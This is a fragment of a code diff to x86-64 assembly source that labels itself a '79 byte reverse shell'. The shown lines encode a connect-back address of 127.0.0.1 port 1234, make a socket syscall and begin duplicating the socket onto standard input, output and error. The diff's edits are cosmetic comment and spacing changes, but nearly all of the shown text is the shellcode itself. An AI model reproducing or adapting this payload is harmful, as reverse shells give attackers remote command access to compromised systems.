@@ -27,8 +27,9 @@
 ;  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 ;  POSSIBILITY OF SUCH DAMAGE.
 ;    
-
-    bits 64
+; 79 byte reverse shell
+;
+    bits    64
 
     mov     rcx, ~0x0100007fd2040200
     not     rcx
@@ -48,7 +49,7 @@
     mov     al, 97
     syscall
     
-    xchg    eax, edi         ; edi=sockfd
+    xchg    eax, edi         ; edi=s
     xchg    eax, esi         ; esi=2
     
     ; step 2, assign socket handle to stdin,stdout,stderr
